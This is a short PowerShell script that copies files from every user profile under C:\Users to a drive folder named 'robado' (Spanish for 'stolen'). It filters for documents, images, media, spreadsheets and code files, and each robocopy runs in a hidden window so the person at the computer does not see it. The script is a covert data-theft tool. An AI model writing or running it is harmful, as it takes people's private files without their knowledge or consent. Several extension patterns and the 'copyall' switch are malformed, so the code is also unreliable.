$source = "C:\Users"
$destination = "E:\robado"
$extensionFilter = @("*.txt","*.pdf","*.odt","*.docx","*.png","*.jpg","*.mp4","*.xlsx","*py","*.css","*mp3",".java","*.json","*.md")
$arguments = "/e /s /z copyall"

foreach ($ext in $extensionFilter) {
    $cmd = "robocopy $source $destination $ext $arguments"
    Start-Process -WindowStyle Hidden -FilePath "cmd" -ArgumentList "/c", $cmd
}